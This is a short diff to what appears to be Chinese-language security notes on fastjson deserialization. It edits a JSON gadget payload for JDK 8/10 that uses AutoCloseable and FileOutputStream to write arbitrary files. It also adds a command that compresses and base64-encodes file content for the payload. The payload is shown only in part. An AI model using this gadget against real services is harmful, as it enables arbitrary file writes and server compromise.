@@ -798,6 +798,8 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
 
 适用于jdk8/10的
 
+cat test.txt | openssl zlib | base64 -w 0
+
 ```java
 {
     '@type':"java.lang.AutoCloseable",
@@ -808,7 +810,7 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
         'out':
         {
            '@type':'java.io.FileOutputStream',
-           'file':'dst',
+           'file':'路径',
            'append':false
         },
         'infl':
